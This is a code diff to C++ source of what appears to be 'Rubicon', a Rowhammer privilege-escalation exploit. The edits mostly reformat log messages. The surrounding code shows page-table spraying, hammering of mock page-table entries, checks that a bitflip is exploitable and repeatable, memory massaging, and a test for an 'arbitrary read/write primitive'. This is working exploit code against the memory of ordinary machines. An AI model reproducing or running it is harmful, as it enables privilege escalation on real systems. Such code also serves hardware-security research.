@@ -66,7 +66,7 @@ bool Rubicon::check_repeatability(
                             << (use_hugepage ? 22 : 19);
     uint64_t pte = pte_template | unknown_bits;
     uint64_t pte_flipped = pte ^ bitflip_mask64;
-    Logger::log_info(format_string("PTE: %lx\n", pte));
+    Logger::log_info(format_string("  Hammering mock PTE: 0x%lx", pte));
 
     memset(page_ptr, 0, PAGE_SIZE);
     *pte_ptr = pte;
@@ -78,7 +78,7 @@ bool Rubicon::check_repeatability(
 
     clflushopt(pte_ptr);
     asm volatile("mfence" ::: "memory");
-    Logger::log_info(format_string("PTE flipped: %lx\n", *pte_ptr));
+    Logger::log_info(format_string("    Result: 0x%lx", *pte_ptr));
     if (*pte_ptr != pte_flipped) {
       restore_page(reinterpret_cast<int *>(page_ptr));
       return false;
@@ -107,7 +107,6 @@ void Rubicon::close_spraying_file() {
 }
 
 int Rubicon::spray_tables() {
-  Logger::log_info("Spraying tables...\n");
   for (unsigned i = 1; i < NR_VMA_LIMIT; ++i) {
     void *addr =
         reinterpret_cast<void *>(SPRAY_BASE + PAGE_TABLE_BACKED_SIZE * i);
@@ -190,12 +189,13 @@ void Rubicon::e2e(CodeJitter &code_jitter, FuzzingParameterSet &fuzzing_params,
     uint64_t bitflip_corrupted64 =
         bitmask_to_64bit(bitflip.corrupted_data, bitflip_address64);
 
-    Logger::log_info("Testing bitflip:\n");
+    Logger::log_info("Testing bitflip:");
     Logger::log_info(
-        format_string("  Address: %p\n", bitflip.address.to_virt()));
-    Logger::log_info(format_string("  Bitmask: %lx\n", bitflip_mask64));
+        format_string("  Address: %p", bitflip.address.to_virt()));
+    Logger::log_info(format_string("  Bitmask: 0x%lx", bitflip_mask64));
     Logger::log_info(
-        format_string("  Corrupted data: %lx\n", bitflip_corrupted64));
+        format_string("  Corrupted data: 0x%lx", bitflip_corrupted64));
+    Logger::flush();
 
     // the first condition checks whether the PTE points to a page within the
     // massaged THP after the bitflip, the second condition checks whether the
@@ -203,7 +203,7 @@ void Rubicon::e2e(CodeJitter &code_jitter, FuzzingParameterSet &fuzzing_params,
     if ((bitflip_mask64 & (~(alignment - 1) | (PAGE_SIZE - 1))) ||
         ((bitflip_address64 & bitflip_mask64) ^
          (bitflip_corrupted64 & bitflip_mask64))) {
-      Logger::log_info("Bitflip is not exploitable.\n");
+      Logger::log_info("  Bitflip is not exploitable.");
       Logger::flush();
       continue;
     }
@@ -211,12 +211,13 @@ void Rubicon::e2e(CodeJitter &code_jitter, FuzzingParameterSet &fuzzing_params,
     if (!check_repeatability(code_jitter, fuzzing_params, random_rows,
                              wait_until_hammering_us, bitflip_address64,
                              bitflip_mask64, bitflip_corrupted64)) {
-      Logger::log_info("Bitflip is not repeatable.\n");
+      Logger::log_info("  Bitflip is not repeatable.");
       Logger::flush();
       continue;
     }
 
-    Logger::log_info("Found exploitable bitflip: %lu\n", realtime_now());
+    Logger::log_info("Found exploitable bitflip!");
+    Logger::log_timestamp();
     Logger::flush();
 
     void *file_target = align_ptr_to_page(bitflip_address64 ^ bitflip_mask64);
@@ -266,9 +267,10 @@ void Rubicon::e2e(CodeJitter &code_jitter, FuzzingParameterSet &fuzzing_params,
       }
     }
 
-    Logger::log_info(format_string("Block: %p\n", block));
-    Logger::log_info(format_string("File target: %p\n", file_target));
-    Logger::log_info(format_string("Table target: %p\n", table_target));
+    Logger::log_info("Massaging...");
+    Logger::log_info(format_string("File target: %p", file_target));
+    Logger::log_info(format_string("Table target: %p", table_target));
+    Logger::flush();
 
     if (use_hugepage)
       huge_split(block);
@@ -307,12 +309,11 @@ void Rubicon::e2e(CodeJitter &code_jitter, FuzzingParameterSet &fuzzing_params,
 
     clflushopt(&(victim[victim_offset >> 12]));
     asm volatile("mfence" ::: "memory");
-    Logger::log_info(format_string("Value: %lx.", victim[victim_offset >> 12]));
+    // Logger::log_info(format_string("Value: %lx.", victim[victim_offset >> 12]));
 
     if ((victim[victim_offset >> 12] & 0xff) == 0x27UL) {
-      Logger::log_info(format_string("R/W Primitive achieved!"));
-      Logger::log_info(format_string("  Timestamp: %lu.", realtime_now()));
-      Logger::flush();
+      Logger::log_info("Successfully obtained arbitrary read/write primitive!");
+      Logger::log_timestamp();
     }
 
     victim[victim_offset >> 12] = victim[victim_offset >> 12] ^ bitflip_mask64;
@@ -330,7 +331,6 @@ void Rubicon::e2e(CodeJitter &code_jitter, FuzzingParameterSet &fuzzing_params,
 
     close_spraying_file();
 
-    Logger::flush();
     exit(EXIT_SUCCESS);
     return;
   }
